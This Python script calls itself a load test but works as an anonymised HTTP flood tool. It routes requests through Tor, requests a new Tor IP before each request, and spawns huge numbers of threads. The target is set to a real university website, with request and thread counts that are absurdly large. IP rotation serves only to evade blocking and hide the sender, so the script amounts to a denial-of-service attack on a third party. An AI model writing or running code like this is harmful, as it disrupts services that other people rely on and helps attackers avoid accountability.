import requests
import threading
import time
from stem import Signal
from stem.control import Controller

# Function to change Tor IP address
def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

# Function to make a request through Tor
def make_tor_request(url):
    renew_tor_ip()
    proxies = {
        'http': 'socks5://localhost:9050',
        'https': 'socks5://localhost:9050'
    }
    response = requests.get(url, proxies=proxies)
    return response

# Function to send HTTP requests to the server
def send_requests(url, num_requests):
    try:
        for _ in range(num_requests):
            response = make_tor_request(url)
            # Print response status code and elapsed time
            print(f"Response Code: {response.status_code}, Elapsed Time: {response.elapsed.total_seconds()} seconds")
    except Exception as e:
        print(f"Error: {e}")

# Function to create and start threads for sending requests
def start_load_test(url, total_requests, batch_size, num_threads):
    print(f"Starting Load Test with {total_requests} requests and {num_threads} threads...")
    start_time = time.time()
    # Calculate number of batches
    num_batches = total_requests // batch_size
    # Create threads and distribute batches among them
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(url, batch_size))
        threads.append(thread)
        thread.start()
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    end_time = time.time()
    print(f"Load Test completed in {end_time - start_time} seconds")

# Example usage
if __name__ == "__main__":
    url = "https://www.ku.edu.np/"  # Replace with your website URL
    total_requests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  # Total number of requests to send
    batch_size = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  # Number of requests per batch
    num_threads = 1000000000000000000000000000000000000000000000000000000000000000000000000000  # Number of threads (concurrent users)
    start_load_test(url, total_requests, batch_size, num_threads)
